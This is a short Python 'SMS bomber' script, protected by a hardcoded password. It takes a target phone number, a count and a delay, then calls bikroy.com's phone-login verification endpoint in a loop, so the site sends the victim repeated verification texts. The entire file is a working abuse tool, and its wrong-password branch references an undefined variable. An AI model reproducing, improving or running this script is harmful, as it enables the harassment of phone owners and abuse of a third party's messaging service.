import requests
import time
import sys



#color                          					{
color_off="\033[0m"       # Text Reset
black="\033[0;30m"        # Black
red="\033[0;31m"          # Red
green="\033[0;32m"        # Green
yellow="\033[0;33m"       # Yellow
blue="\033[0;34m"         # Blue
purple="\033[0;35m"       # Purple
cyan="\033[0;36m"         # Cyan
white="\033[0;37m"        # White
												
															#}
								
print(yellow+"""

   ###    ##     ##  ######     ###    ##    ## 
  ## ##   ##     ## ##    ##   ## ##   ###   ## 
 ##   ##  ##     ## ##        ##   ##  ####  ## 
##     ## #########  ######  ##     ## ## ## ## 
######### ##     ##       ## ######### ##  #### 
##     ## ##     ## ##    ## ##     ## ##   ### 
##     ## ##     ##  ######  ##     ## ##    ## 



"""+color_off)

usrn="7034"
inpusr=(input(red+"[∆] Enter your password :"+color_off))
if usrn==inpusr:
	print(green+"[✓] Password Correct !\n"+color_off)
	pass
else:
	print(red+"[×] Wrong password enter!"+color_color)
	sys.exit()

number=str(input(
          purple+"       HELLO AHSAN "+color_off+green+"\n\n[1] ENTER THE NUMBER :"
))

api="https://bikroy.com/data/phone_number_login/verifications/phone_login?phone="+number

amount=int(input(

  green+        "[2] Enter amount :"
          
          ))
timer=int(input( 

"[3] Enter sleep :" 

))





for i in range(amount):
	requests.get(api)
	print(str(i+1)+color_off+red+"[✓]sms sent")
	time.sleep(timer)